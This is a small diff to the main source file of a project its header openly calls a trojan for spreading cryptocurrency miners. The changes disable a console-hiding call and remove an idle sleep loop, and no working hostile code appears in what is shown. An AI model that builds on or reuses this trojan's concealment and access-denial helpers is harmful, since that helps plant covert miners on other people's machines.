@@ -1,4 +1,4 @@
-/*
+﻿/*
 	# Discordia
 	Discordia it's trojan for dissemination miners. Discordia written in C / C++.
 
@@ -14,21 +14,19 @@
 #include "stdafx.h"
 #include "Utils.h"
 
+#include <Windows.h>
+#include <WindowsX.h>
+
+
 using namespace std;
 
 Utils utils;
 
 int main()
 {
-	utils.HideConsole();
+
+	//utils.HideConsole();
 	//utils.DenyAccess();
-
-	while (true)
-	{
-
-
-		Sleep(300000);// 5 minutes sleep
-	}
 
 	std::cin.get();
     return 0;
